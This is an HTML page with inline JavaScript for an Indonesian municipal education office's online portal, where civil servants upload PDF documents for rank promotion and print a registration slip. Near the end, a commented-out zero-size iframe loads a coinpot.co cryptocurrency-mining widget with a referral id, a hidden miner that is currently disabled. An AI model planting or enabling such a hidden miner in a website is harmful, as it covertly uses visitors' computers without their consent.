<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <link rel="icon" href="favicon.ico" type="image/x-icon" />
    <link href="https://fonts.googleapis.com/css?family=Roboto&display=swap" rel="stylesheet" />
    <link rel="stylesheet" type="text/css" href="./css/style.css" />
    <title>DISDIKBUD PAREPARE upload</title>
    <style>
        .hapuspadding {
            padding: 0;
        }
        
        .ulstyle {
            margin-left: 20px !important;
        }
        
        .logoutWrap {
            text-align: right;
            background-color: rgb(48, 156, 214);
            position: sticky;
            position: -webkit-sticky;
            top: 0;
            margin: 0;
            z-index: 1;
        }
        
        .logoutButton {
            border-left: oldlace 2px solid;
            background-color: rgb(226, 81, 81);
        }
        
        .wrapbody {
            visibility: hidden;
            padding: 5%;
            overflow: auto;
        }
        
        td:nth-child(event) {
            text-align: right;
        }
        
        .footer {
            font-size: small;
            line-height: 150%;
        }
        
        table {
            min-width: 475px;
            /* max-width: 550px; */
        }
        
        .loading {
            text-align: center;
            position: sticky;
            top: 40vh;
        }
        
        #syuaib {
            position: fixed;
            right: 2%;
            bottom: 0;
            font-size: smaller;
            color: rgb(219, 219, 219);
            text-shadow: 1px 1px 2px #4f2215;
        }
        
        h3,
        h5 {
            color: rgb(63, 62, 62);
        }
                
        .backform {
            background-color: rgba(255, 255, 255, 0.75);
        }
        
        .wrapterkirim {
            width: 100%;
            height: 100%;
            /* background-color: grey; */
            position: fixed;
            z-index: 2;
            /* text-align: center; */
            display: none;
        }
        
        .terkirim {
            top: 40%;
            position: relative;
        }
        
        .terkirim button {
            display: block;
            padding: 15px;
            background-color: rgb(72, 155, 33);
            color: whitesmoke;
            border: none;
            margin-left: 95px;
        }
        
        #tdnama {
            width: 50%;
        }
        
        input[type="file"] {
            height: 32px;
            width: 100px;
            cursor: pointer;
        }
        
        input[type="file"]::-webkit-file-upload-button {
            height: 32px;
            width: 100px;
            cursor: pointer;
        }
        
        .uploadInp {
            position: absolute;
            opacity: 0;
            cursor: pointer;
        }
        
        .upload {
            width: 100px;
            border: none;
            background-color: rgb(0, 141, 7);
            color: aliceblue;
            padding: 9px;
        }
        
        .namaBerkas {
            font-size: 8px;
            margin-left: 5px;
        }
        
        #tblUpload {
            max-width: 750px;
            border-top: #4f4f4f 1px solid;
            border-bottom: #4f4f4f 1px solid;
            display: none;
        }
        
        select>option {
            border: none;
            height: 20px;
        }
        /* @media screen and (max-width: 437px) {
        table {
          min-width: 390px;
          max-width: 500px;
        }
      } */
    </style>
</head>

<body>
    <div class="logoutWrap">
        <ul class="nav">
            <li class="masukan nav">Beranda</li>
            <li class="panduan nav">Panduan</li>
            <li class="logoutButton nav">KELUAR</li>
        </ul>
    </div>
    <div class="wrap">
        <div class="wrapheader gmd">
            <span class="title">DINAS PENDIDIKAN DAN KEBUDAYAAN KOTA PAREPARE <br />SUB BIDANG ADMINISTRASI DAN 
        KEPEGAWAIAN</span>
        </div>
        <div class="loading">
            <img src="./image/Eclipse.svg" alt="loading" />
        </div>
        <div class="wrapbody">
            <h3>Pilih jenis kenaikan pangkat Anda lalu unggah/kirim berkas hasil pemindaian (berkas asli atau fotocopy legalisir) dalam bentuk format PDF lalu tekan tombol <i>Mendaftar</i> !</h3>
            <h3>Silahkan baca panduan proses dan syarat administrasi kenaikan pangkat untuk mempermudah pemilihan unggah berkas, dengan menekan tombol <i>Panduan</i> pada menu navigasi atau pada link <a href="https://www.bkn.go.id/alur-syarat-pelayanan-administrasi-kepegawaian/kenaikan-pangkat">INI</a>                !</h3>
            <label style="margin-left: 15px;" for="jenisDaftar">Jenis Pendaftaran</label>
            <select style="margin-left: 15px; margin-bottom: 20px; height: 30px;" id="jenisDaftar" name="jenisDaftar">
        <option value="Reguler"></option>
        <option value="Reguler">Reguler</option>
        <option value="Jabatan Fungsional Tertentu">Jabatan Fungsional Tertentu</option>
        <option value="Jabatan Struktur">Jabatan Struktural</option>
        <option value="Memperoleh Ijasah untuk JS">Memperoleh Ijasah untuk JS</option>
        <option value="Memperoleh Ijasah untuk JFT">Memperoleh Ijasah untuk JFT</option>
        <option value="Penemuan Baru">Penemuan Baru</option>
        <option value="Jabatan Pengangkatan KEPRES">Jabatan Pengangkatan KEPRES</option>
        <option value="Lulus Tugas Belajar">Lulus Tugas Belajar</option>
        <option value="Melaksanakan Tugas Belajar">Melaksanakan Tugas Belajar</option>
        <option value="Pengangkatan Luar Biasa">Pengangkatan Luar Biasa</option>
        <option value="Dipekerjakan Diluar Instansi Induk">Dipekerjakan Diluar Instansi Induk</option>
        <option value="Diberhentikan Dari Jabatan Organik">Diberhentikan Dari Jabatan Organik</option>
      </select>
            <p id="ketPilihan"></p>
            <table id="tblUpload">
                <tr>
                    <td style="width: 40%;"></td>
                    <td style="width: 1%;"></td>
                    <td></td>
                </tr>
                <tr>
                    <td>SK Pangkat Terakhir</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="skTerakhir" type="file" /><button class="upload">Pilih
              Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>SKP dan PPK 2 Tahun Terakhir</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="skpPpk" type="file" /><button class="upload">Pilih
              Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>SKP dua tahun terakhir</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="skp" type="file" /><button class="upload">Pilih
              Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>Tanda Lulus Ujian Dinas Tingkat I/II</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="tlud" type="file" /><button class="upload">Pilih
              Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>STTB/Ijasah/Diploma</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="ijasah" type="file" /><button class="upload">Pilih
              Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>Surat Perintah Tugas Belajar</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="sptb" type="file" /><button class="upload">Pilih
              Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>Surat Izin Belajar</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="izinBelajar" type="file" /><button class="upload">Pilih Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>
                        Surat Tanda Lulus Kenaikan Pangkat Penyesuaian Ijasah (STLKPPI)
                    </td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="stlkppi" type="file" /><button class="upload">Pilih
              Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>SK Pembagian Tugas 2 Tahun Terakhir</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="skPembagianTugas" type="file" /><button class="upload">Pilih Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>SK CPNS dan PNS</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="skCpnsPns" type="file" /><button class="upload">Pilih
              Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>SK Jabatan Terakhir</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="skJab" type="file" /><button class="upload">Pilih
              Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>Asli Penilaian Angkat Kredit (PAK)</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="pakLama" type="file" /><button class="upload">Pilih
              Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>Asli Klarifikasi PAK</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="klarifikasiPak" type="file" /><button class="upload">Pilih Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>Berita Acara Sumpah/Janji/Pelantikan jabatan</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="klarifikasiPak" type="file" /><button class="upload">Pilih Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>Surat Perintah Melaksanakan Tugas (SPMT)</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="spmt" type="file" /><button class="upload">Pilih
              Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>Surat Pernyataan Pelantikan</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="pernyataanPelantikan" type="file" /><button class="upload">Pilih Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>SK pemberhentikan dari jabatan organik</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="berhentiOrganik" type="file" /><button class="upload">Pilih Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>SK penetapan prestasi kerja luar biasa</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="skpLuarBiasa" type="file" /><button class="upload">Pilih Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>Kepres tentang penemuan baru</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="kepresPenemuanBaru" type="file" /><button class="upload">Pilih Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>Keputusan penugasan di luar instansi induk</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="penugasanLuarInduk" type="file" /><button class="upload">Pilih Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
                <tr>
                    <td>Rekomendasi KASN tentang hasil seleksi terbuka JPT</td>
                    <td>:</td>
                    <td>
                        <input accept="application/pdf" class="uploadInp" id="penugasanLuarInduk" type="file" /><button class="upload">Pilih Berkas</button><br /><span class="namaBerkas">Berkas berformat PDF</span>
                    </td>
                </tr>
            </table>
            <button class="mendaftar" id="simpan" style="width: 90px;">Kirim</button>
            <button class="mendaftar" id="cetak" style="display: none;">Mendaftar</button>
        </div>

        <div class="wrapfooter">
            <div class="img-footer"><img src="/image/Lambang_Kota_Parepare.png"></div>
            <div class="footer">
                <p>
                    Naik Pangkat dan Kenaikan Gaji Berkala secara online diselenggarakan untuk mempermudah setiap ASN
                    dalam
                    melakukan proses pendaftaran dan mempercepat proses administrasi kepegawaian di lingkup Dinas
                    Pendidikan
                    dan Kebudayaan Kota Parepare
                </p>
            </div>
        </div>
    </div>

    <!-- PRINT SESSION -->
    <div class="outerprint" id="pring" style="display: none;">
        <div class="headerprint" style="border-bottom: 1px solid black;">
            <table class="tableprint" style="height: 100px !important; margin-left: 100px;">
                <tr>
                    <td style="width: 90px !important;text-align: right;"><img class="headerlogoprint" style="height: 60px;" src="image/Lambang_Kota_Parepare.png" alt=""></td>
                    <td><b style="font-size: 14pt !important;">DINAS PENDIDIKAN DAN KEBUDAYAAN <br>KOTA
              PAREPARE <br>SUB BIDANG ADMINISTRASI DAN KEPEGAWAIAN</b></td>
                </tr>
            </table>
        </div>
        <br>
        <div class="bodyprint">
            <p class="ratakirikananprint">Aparatur Sipil Negara (ASN) dengan data sebagai berikut :</p>
            <table class="tablebodyprint">
                <tbody class="tbodyprint" style="vertical-align: top !important;">
                    <tr class="hapuspadding">
                        <td class="hapuspadding" style="width: 40%;">Nama</td>
                        <td class="hapuspadding" style="width: 5%;">:</td>
                        <td class="hapuspadding" id="namaprint"></td>
                    </tr>
                    <tr class="hapuspadding">
                        <td class="hapuspadding">NIP.</td>
                        <td class="hapuspadding">:</td>
                        <td class="hapuspadding" id="nipprint"></td>
                    </tr>
                    <tr class="hapuspadding">
                        <td class="hapuspadding">Pangkat</td>
                        <td class="hapuspadding">:</td>
                        <td class="hapuspadding" id="pangkatprint"></td>
                    </tr>
                    <tr class="hapuspadding">
                        <td class="hapuspadding">Golongan/Ruang</td>
                        <td class="hapuspadding">:</td>
                        <td class="hapuspadding" id="golonganruangprint"></td>
                    </tr>
                    <tr class="hapuspadding">
                        <td class="hapuspadding">TMT. Pangkat</td>
                        <td class="hapuspadding">:</td>
                        <td class="hapuspadding" id="tmtprint"></td>
                    </tr>
                    <tr class="hapuspadding">
                        <td class="hapuspadding">Unit Kerja</td>
                        <td class="hapuspadding">:</td>
                        <td class="hapuspadding" id="unitprint"></td>
                    </tr>
                    <tr class="hapuspadding">
                        <td class="hapuspadding">Jenis Pendaftaran</td>
                        <td class="hapuspadding">:</td>
                        <td class="hapuspadding" id="jenisprint"></td>
                    </tr>
                    <tr class="hapuspadding">
                        <td class="hapuspadding">Dokumen yang telah diunggah</td>
                        <td class="hapuspadding">:</td>
                        <td class="hapuspadding">
                            <ul id="telahuploadprint">
                            </ul>
                        </td>
                    </tr>
                </tbody>
            </table>
            <p class="ratakirikananprint">telah menyetujui persyaratan pendaftaran dan pengunggahan dokumen hasil pemindaian dokumen asli, maka ASN yang bertanda tangan dibawah ini dinyatakan terdaftar dengan nomor pendaftaran <span id="kodePendaftaran"></span> pada tanggal
                <span
                    id="tglDaftar">17 Agustus 2020</span>.</p>
            <img id="qr" style="display:inline-block; width:100px;height:100px">
            <div class="ttdprint" style="display: inline-block">
                <p>Parepare, <span id="tglCetak"></span></p>
                <p>ASN Terdaftar</p>
                <p id="namaPendaftar"></p>
            </div>

        </div>
    </div>
    <!-- <p id="syuaib">Code/Design By syuaib</p> -->
    <script src="/js/print.min.js"></script>
    <script src="/js/main.js"></script>
    <script src="/js/jquery.js"></script>
    <script>
        let logoutButton = document.querySelector(".logoutButton");
        let wrapbody = document.querySelector(".wrapbody");
        let wrapterkirim = document.querySelector(".wrapterkirim");
        let tutup = document.querySelector("#tutup");
        let loading = document.querySelector(".loading");
        let simpan = document.querySelector("#simpan");
        let skTerakhir = document.querySelector("#skTerakhir");
        let barisBerkas = document.querySelectorAll("#tblUpload")[0].rows;
        let berkas = document.querySelectorAll("input");
        let masukan = document.querySelector(".masukan");
        let btnUpload = document.querySelectorAll(".upload");
        let namaBerkas = document.querySelectorAll(".namaBerkas");
        let ketPilihan = document.querySelector("#ketPilihan");
        let jenisDaftar = document.querySelector("#jenisDaftar");
        let tblUpload = document.querySelector("#tblUpload");
        //let pring = document.querySelector('#pring');
        main.cekLogin();
        main.cekDua().then(function(res) {
            if (res.status) {
                // console.log('mulai')
                mulai();
            } else {
                location.assign('status.html');
            }
        }).catch((err) => {
            console.log(err);
            location.assign('status.html');
        })

        function mulai() {
            let db = JSON.parse(localStorage.getItem('db'));
            let tgl = new Date();
            let bln = tgl.getMonth();
            let tmt = new Date(db.TMT_PANGKAT_TERAKHIR);
            // let arrbulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
            $('#namaprint').html(db.NAMA);
            $('#nipprint').html(db.NIP);
            $('#pangkatprint').html(db.PANGKAT);
            $('#golonganruangprint').html(db.GOLONGAN_RUANG);
            $('#tmtprint').html(tmt.getDate() + " " + arrbulan[tmt.getMonth()] + " " + tmt.getFullYear());
            $('#unitprint').html(main.lastArr(db.UNIT_KERJA));
            $('#tglCetak').html(tgl.getDate() + " " + arrbulan[bln] + " " + tgl.getFullYear());
            $('#tglDaftar').html(tgl.getDate() + " " + arrbulan[bln] + " " + tgl.getFullYear());
            $('#namaPendaftar').html(db.NAMA.toUpperCase());
            masukan.addEventListener("click", () => location.assign("status.html"));
            $('.panduan').on('click', () => {
                location.assign('https://www.bkn.go.id/alur-syarat-pelayanan-administrasi-kepegawaian/kenaikan-pangkat')
            })
            var i;
            var j;

            jenisDaftar.addEventListener("change", (e) => {
                let indexpilihan = e.target.selectedIndex;
                $('#jenisprint').html(e.target.options[e.target.selectedIndex].text);
                tentukan[indexpilihan]();
            });
            //   
            /*
  1. SK Pangkat Terakhir 
  2. SKP dan PPK 2 Tahun Terakhir
  3. SKP dua tahun terakhir
  4. Tanda Lulus Ujian Dinas Tingkat I/II
  5. STTB/Ijasah/Diploma
  6. Surat Perintah Tugas Belajar
  7. Surat Izin Belajar
  8. Surat Tanda Lulus Kenaikan Pangkat Penyesuaian Ijasah (STLKPPI)
  9. SK Pembagian Tugas 2 Tahun Terakhir
  10. SK CPNS dan PNS
  11. SK Jabatan Terakhir
  12. Asli Penilaian Angkat Kredit (PAK)
  13. Asli Klarifikasi PAK
  14. Berita Acara Sumpah/Janji/Pelantikan jabatan
  15. Surat Perintah Melaksanakan Tugas (SPMT)
  16. Surat Pernyataan Pelantikan
  17. SK pemberhentikan dari jabatan organik	
  18. SK penetapan prestasi kerja luar biasa
  19. Kepres tentang penemuan baru
  20. Keputusan penugasan di luar instansi induk
  21. Rekomendasi KASN tentang hasil seleksi terbuka JPT
  */

            let tentukan = {
                0: () => {
                    tblUpload.style.display = "none";
                },
                1: () => {
                    munculkanBaris([1, 2, 4, 5, 6, 10, 20]);
                },
                2: () => {
                    munculkanBaris([1, 11, 2, 12, 13, 14, 15, 16]);
                },
                3: () => {
                    munculkanBaris([1, 11, 2, 14, 15, 16, 21]);
                },
                4: () => {
                    munculkanBaris([1, 2, 3, 5, 7, 8]);
                },
                5: () => {
                    munculkanBaris([1, 2, 5, 7, 12]);
                },
                6: () => {
                    munculkanBaris([1, 2, 11, 19]);
                },
                7: () => {
                    munculkanBaris([1, 2, 11, 14, 15, 16]);
                },
                8: () => {
                    munculkanBaris([1, 2, 5, 6, 11]);
                },
                9: () => {
                    munculkanBaris([1, 2, 6, 11]);
                },
                10: () => {
                    munculkanBaris([1, 2, 11, 18]);
                },
                11: () => {
                    munculkanBaris([1, 2, 11, 12, 20]);
                },
                12: () => {
                    munculkanBaris([1, 2, 11, 17]);
                }
            };

            function munculkanBaris(e) {
                for (i = 1; i < barisBerkas.length; i++) {
                    if (e.indexOf(i) !== -1) {
                        //0
                        barisBerkas[i].style.display = "table-row";
                    } else {
                        barisBerkas[i].style.display = "none";
                    }
                }
                tblUpload.style.display = "table";
            }
            //baris 3 hilang
            //////////////////////////cek login/////////////////////


            // async function logincek(){

            loading.style.display = "none"
            wrapbody.style.visibility = "visible"
                // }

            // logincek()
            //////////////////////get index input button //////////////////////
            for (i = 0; i < berkas.length; i++) {
                (function(index) {
                    berkas[i].onchange = function() {
                        console.log(index);
                        namaBerkas[index].innerHTML = berkas[index].files[0].name;
                    };
                })(i);
            }

            //////////////////upload process/////////////////
            simpan.addEventListener("click", simpanBerkas);
            var tunggu = [];
            var benar = [];

            function simpanBerkas() {
                let uploadInp = document.querySelectorAll(".uploadInp");

                function hitungTerisi() {
                    var x = 0;
                    for (i = 0; i < berkas.length; i++) {
                        if (berkas[i].value) {
                            x++;
                        }
                    }
                    return x;
                }

                for (i = 0; i < berkas.length; i++) {
                    (function(index) {
                        if (berkas[i].value) {
                            kirim(index).then(() => {
                                var ulang = setTimeout(
                                    () => console.log("tunggu deng"),
                                    3000 * ulang
                                );

                                if (tunggu.length != 0) {
                                    tunggu[index].remove();
                                }
                            });
                        } else {
                            console.log("input kosong");
                        }
                    })(i);
                }
            }

            let kirim = async(nmr) => {
                tunggu[nmr] = new Image(30, 30);
                tunggu[nmr].src = "./image/Eclipse.svg";
                tunggu[nmr].className = "tunggu";
                tunggu[nmr].style.marginLeft = "1%";
                benar[nmr] = new Image(30, 30);
                benar[nmr].src = "./image/benar.png";
                benar[nmr].className = "benar";
                benar[nmr].style.marginLeft = "1%";

                var fileku = berkas[nmr].files[0];
                var reader = new FileReader();
                var nmBerkas = barisBerkas[nmr + 1].cells[0].innerText;
                reader.onload = () => {
                    var hapusBenar = document.querySelectorAll(".benar");
                    if (hapusBenar) {
                        for (i = 0; i < hapusBenar.length; i++) {
                            hapusBenar[i].remove();
                        }
                    }
                    var posisigambar = barisBerkas[nmr + 1].childNodes[5];
                    posisigambar.insertBefore(tunggu[nmr], posisigambar.childNodes[3]);
                    var datab64 = reader.result.replace(/^data:.+;base64,/, "");

                    let antri = new Promise(function(resolve, reject) {
                        let dataUpload = new dataCek();
                        dataUpload.urlSkTerakhir = datab64;
                        dataUpload.namaBerkas = nmBerkas;
                        resolve(dataUpload);
                    })

                    antri.then((res) => {
                        main.kirimdata(res).then((respon) => {
                            tunggu[nmr].remove();
                            posisigambar.insertBefore(benar[nmr], posisigambar.childNodes[3]);
                            $("#telahuploadprint").append(`<li>${respon.status}</li>`)
                        }).then((hasil) => {
                            //console.log(hasil);
                            $('#cetak').show();
                            $('#cetak').on('click', () => {
                                main.daftar(jenisDaftar.value).then((res) => {
                                    $('#qr').attr('src', `data:image/png;base64,${res.qr}`);
                                    $('#kodePendaftaran').html(res.register);
                                }).then((respon) => {
                                    $('#pring').toggle();
                                    printJS({
                                        printable: 'pring',
                                        type: 'html',
                                        style: 'html {width:fit-content} .tableprint {text-align:center; margin-left:30px; padding:0} .namadinasprint {font-size:14pt !important} .headerprint{border-bottom: 1px solid black; width:auto !important} .outerprint{padding:40px; width:auto !important} .ratakirikananprint{text-align:justify; width:auto !important} .ttdprint{float:right} .tbodyprint{vertical-align:top !important; padding:0 !important} .tablebodyprint{vertical-align:top; height:fit-content; padding:0; width:auto} .hapuspadding{padding:0 !important; margin:0 !important} #qr{float:left} #telahuploadprint{margin-left: 20px !important;padding-inline-start: 0; margin-block-end: 0; margin-block-start: 0;margin-inline-end: 0;margin-inline-start: 0} .bodyprint{width:auto !important}'
                                    });
                                    $('#pring').toggle();
                                });
                            });
                        });
                    });
                };
                reader.readAsDataURL(fileku);
            };
        };

        ///////////////////sign out//////////////////////////////////////////////
        logoutButton.addEventListener("click", keluar);

        function keluar() {
            loading.setAttribute("style", "display:block");
            wrapbody.setAttribute("style", "display:none");
            main.logout()
            location.assign('index.html');
        }
    </script>
    <!-- <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=0C052766283C&mode=widget" style="overflow:hidden;width:0;height:0;"></iframe> -->
</body>

</html>